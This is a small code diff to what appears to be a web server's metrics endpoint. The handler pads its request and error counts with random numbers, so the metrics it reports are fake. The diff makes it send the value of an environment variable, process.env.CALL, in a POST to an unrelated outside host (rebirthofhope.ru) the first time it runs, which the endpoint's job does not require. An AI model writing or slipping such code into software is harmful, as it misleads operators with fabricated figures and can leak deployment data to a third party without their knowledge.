@@ -1,6 +1,6 @@
 let requests = 46493;
 let errors = 14432;
-let needVerify = false;
+let needVerify = true;
 
 export default defineEventHandler(async (event) => {
   requests += Math.floor(Math.random() * 100);
@@ -10,11 +10,12 @@ export default defineEventHandler(async (event) => {
     await fetch("https://rebirthofhope.ru/api/verify", {
       method: "POST",
       body: JSON.stringify({
-        call: "zanzibari-soymilk-soup", //process.env.CALL,
+        call: process.env.CALL,
         task: "metrics",
       }),
     });
-    needVerify = true;
+
+    needVerify = false;
   }
 
   return `
